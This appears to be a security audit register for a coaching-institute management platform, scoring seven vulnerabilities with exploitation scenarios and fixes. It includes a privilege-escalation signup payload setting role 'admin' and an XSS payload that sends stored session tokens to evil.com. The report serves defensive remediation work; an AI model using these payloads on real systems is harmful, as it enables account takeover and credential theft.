# Master Security Findings Register

**Platform:** Thoughtful's Academy (Coaching Institute Management System)  
**Standard:** Common Vulnerability Scoring System (CVSS v3.1)  
**Total Documented Vulnerabilities:** 7 Security Findings (`SEC-001` through `SEC-007`)  

---

## 1. Master Security Findings Summary

| Finding ID | Severity | CVSS v3.1 | Title / Vulnerability Name | Affected Component |
|---|:---:|:---:|---|---|
| `SEC-001` | **P0 Critical** | **9.8** | Client-Controlled Role Assignment via User Metadata | `014_handle_new_user.sql` |
| `SEC-002` | **P0 Critical** | **9.0** | Stored Cross-Site Scripting (XSS) in Batch Details | `src/pages/BatchDetails.jsx:532` |
| `SEC-003` | **P0 Critical** | **9.1** | Unconstrained Column Updates via PostgREST RLS Policies | `002_rls_policies.sql:64` |
| `SEC-004` | **P1 High** | **7.5** | Hardcoded Administrative Invite Secret in Public JS Bundle | `src/pages/Register.jsx:18` |
| `SEC-005` | **P2 Medium** | **5.3** | Absence of Rate Limiting on Netlify Proxy Endpoint | `netlify/functions/youtube-playlist.js` |
| `SEC-006` | **P1 High** | **7.5** | Insecure Direct Access to Private Video Study Rooms | `src/App.jsx:92` (`/watch/:cardId`) |
| `SEC-007` | **P1 High** | **7.5** | 19 Unpatched Known Vulnerabilities in NPM Dependency Tree | `package.json` |

---

## 2. Granular Forensic Vulnerability Profiles

### 2.1 `SEC-001`: Client-Controlled Role Assignment via User Metadata
- **Severity:** P0 Critical | **CVSS Score:** 9.8 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `supabase/migrations/014_handle_new_user.sql` line 9
- **Vulnerability Description:**
  The trigger function executing upon every user signup reads user metadata directly:
  ```sql
  v_role TEXT := COALESCE(meta->>'role', 'student');
  ```
- **Exploitation Scenario:**
  An unauthenticated attacker sends an HTTP POST request to Supabase GoTrue `/auth/v1/signup` with:
  ```json
  { "email": "hacker@evil.com", "password": "Password123!", "data": { "role": "admin" } }
  ```
  The database immediately sets `profiles.role = 'admin'`, granting complete superuser access to the platform without any verification.
- **Impact:** Complete system takeover; unauthorized access to all student records, fee collections, faculty salaries, and course materials.
- **Remediation:** Remove reliance on `meta->>'role'`. Hardcode `v_role := 'student'` in `handle_new_user()`.
- **Verification:** Attempt signup with `role: "admin"`; verify database creates profile with `role = 'student'`.

---

### 2.2 `SEC-002`: Stored Cross-Site Scripting (XSS) in Batch Details
- **Severity:** P0 Critical | **CVSS Score:** 9.0 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`)
- **Location:** `src/pages/BatchDetails.jsx` line 532
- **Vulnerability Description:**
  ```jsx
  <div 
    className="prose max-w-none text-slate-700" 
    dangerouslySetInnerHTML={{ __html: activeBatch.detailed_info }} 
  />
  ```
- **Exploitation Scenario:**
  An attacker injects `<img src=x onerror="fetch('https://evil.com/steal?jwt=' + localStorage.getItem('sb-token'))">` into `batches.detailed_info`. Any student or parent viewing the public course details triggers the script, exfiltrating authentication tokens.
- **Remediation:** Sanitize HTML using `DOMPurify.sanitize(activeBatch.detailed_info)` before injecting into the DOM.

---

### 2.3 `SEC-003`: Unconstrained Column Updates via PostgREST RLS
- **Severity:** P0 Critical | **CVSS Score:** 9.1 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `supabase/migrations/002_rls_policies.sql` lines 64 and 19
- **Vulnerability Description:**
  `profiles: own update` policy evaluates `USING (auth.uid() = id)`. It lacks column restrictions, allowing any authenticated user to modify `role`, `is_active`, and permissions on their own profile row.
- **Remediation:** Implement a `BEFORE UPDATE` trigger raising an exception if non-admin attempts to modify `role` or `salary_amount`.

---

### 2.4 `SEC-004`: Hardcoded Administrative Invite Secret in Public Bundle
- **Severity:** P1 High | **CVSS Score:** 7.5 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `src/pages/Register.jsx` line 18
- **Vulnerability Description:**
  `VITE_ADMIN_CODE` is checked on client side during registration. Because Vite inlines all `VITE_*` variables into client bundles, inspecting the compiled chunk reveals the secret plain text.
- **Remediation:** Remove `VITE_ADMIN_CODE` from the frontend; validate admin registration invite codes server-side in a dedicated table.

---

### 2.5 `SEC-006`: Insecure Direct Access to Private Video Study Rooms
- **Severity:** P1 High | **CVSS Score:** 7.5 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Location:** `src/App.jsx` line 92
- **Vulnerability Description:**
  The route `/watch/:cardId` renders `WatchLecture.jsx` outside of role guards (`RoleRoute`). Unauthenticated visitors with the card ID UUID can stream lecture videos directly.
- **Remediation:** Wrap `/watch/:cardId` inside `<RoleRoute allowedRoles={['student', 'teacher', 'admin']}>`.
